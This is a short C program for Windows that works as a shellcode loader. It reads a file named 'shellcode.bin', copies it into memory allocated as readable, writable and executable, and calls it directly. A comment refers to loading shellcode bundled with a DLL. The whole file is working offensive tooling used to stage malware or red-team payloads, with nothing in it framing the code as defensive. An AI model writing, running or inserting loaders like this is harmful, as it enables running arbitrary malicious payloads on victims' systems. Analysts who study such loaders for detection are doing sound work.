#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <string.h>

int main()
{
    DWORD bytesRead;
    const TCHAR* filePath;
    BOOL fileReadSuccess, filePermChangeSuccess, processCreateSuccess;
    //scanf("Enter the shellcode(shellcode+dll) binary file path: %d", filePath);
    filePath = _T("shellcode.bin");

    printf("Loader started!\n");
    printf("Shellcode path: %s\n", filePath);

    HANDLE hFile = CreateFile(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileContent = malloc(fileSize);
    fileReadSuccess = ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL);

    printf("Shellcode size: %d\n", fileSize);

    void *exec = VirtualAlloc(0, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, fileContent, fileSize);
    ((void(*)())exec)();

    return 0;
}